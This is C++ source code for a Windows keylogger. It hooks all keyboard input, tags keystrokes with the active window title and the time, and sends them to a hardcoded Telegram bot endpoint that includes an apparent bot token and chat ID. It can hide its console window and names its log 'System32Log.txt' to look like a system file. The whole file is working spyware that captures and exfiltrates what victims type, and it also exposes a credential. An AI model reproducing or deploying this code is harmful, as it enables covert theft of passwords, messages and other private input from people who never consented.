#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>
#include <stdio.h>
#include <tchar.h>
#include <string.h>
#include <cpr/cpr.h>
#include "stdafx.h"
#include <locale>
#include <iomanip>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream OUTPUT_FILE;

char lastwindow[256];

std::string key;

/*#define MAKELANGID(p, s)       ((((WORD  )(s)) << 10) | (WORD  )(p))

#define PRIMARYLANGID(lgid)    ((WORD  )(lgid) & 0x3ff)
#define SUBLANGID(lgid)        ((WORD  )(lgid) >> 10) */

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, _T("Failed to install hook!"), _T("Error"), MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks

	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout;

	threadID = GetWindowThreadProcessId(foreground, NULL);
	layout = GetKeyboardLayout(threadID);

	WORD language_id = LOWORD(GetKeyboardLayout(threadID));
	
	int sub_language_id = SUBLANGID(language_id);
	int primary_language_id = PRIMARYLANGID(language_id);

	std::cout << sub_language_id << '\n';
	std::cout << primary_language_id << '\n';

	if(primary_language_id==25)
	{
		std::cout << "rus" << '\n';
	}else if (primary_language_id == 9)
	{
		std::cout << "eng" << '\n';
	}
	
	if (foreground) {
		//get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}
	
	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			std::cout << "new window" << '\n';
			auto r = cpr::Get(cpr::Url{ "https://api.telegram.org/bot631844699:AAENUxQKbXeXMq1IVPKGuqL9JSPdWvRiJ90/sendMessage" },
				cpr::Parameters{ {"text", key}, {"chat_id", "383492784"} });
			key.clear();
			strcpy_s(lastwindow, window_title);

			// get time
			//time_t t = time(NULL);
			struct tm newtime;
			__time64_t time;
			errno_t err;

			_time64(&time);
			
			err = _localtime64_s(&newtime, &time);
			char s[64];
			if (err)
			{
				printf("Invalid argument to _localtime64_s.");
				exit(1);
			}
			char timebuf[27];
			
			// Convert to an ASCII representation.
			err = asctime_s(timebuf, 26, &newtime);
			
			key = key + "\n\n[Window: " + window_title + " - at " + timebuf + "] ";
		}
	}


	std::cout << key_stroke << '\n';

	
	
	if (key_stroke == VK_BACK)
		key += "[BACKSPACE]";
	else if (key_stroke == VK_RETURN)
		key += "\n";
	else if (key_stroke == VK_SPACE)
		key += " ";
	else if (key_stroke == VK_TAB)
		key += "[TAB]";
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		key += "[SHIFT]";
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		key += "[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		key += "[ESCAPE]";
	else if (key_stroke == VK_END)
		key += "[END]";
	else if (key_stroke == VK_HOME)
		key += "[HOME]";
	else if (key_stroke == VK_LEFT)
		key += "[LEFT]";
	else if (key_stroke == VK_UP)
		key += "[UP]";
	else if (key_stroke == VK_RIGHT)
		key += "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		key += "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		key += ".";
	else if (key_stroke == 189 || key_stroke == 109)
		key += "-";
	else if (key_stroke == 20)
		key += "[CAPSLOCK]";
	else {
		//char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lowercase = !lowercase;
		}

		//map virtual key according to keyboard layout 
		key += MapVirtualKeyEx(key_stroke, MAPVK_VK_TO_CHAR, layout);

		//tolower converts it to lowercase properly
		//if (!lowercase) key = tolower(key);
		//OUTPUT_FILE << char(key);
		
	}
	//instead of opening and closing file handlers every time, keep file open and flush.
	//OUTPUT_FILE.flush();
	return 0;
}

void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif // visible

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif // invisible
}

int main()
{
	//open output file in append mode
	OUTPUT_FILE.open("System32Log.txt", std::ios_base::app);

	// visibility of window
	Stealth();

	// Set the hook
	SetHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}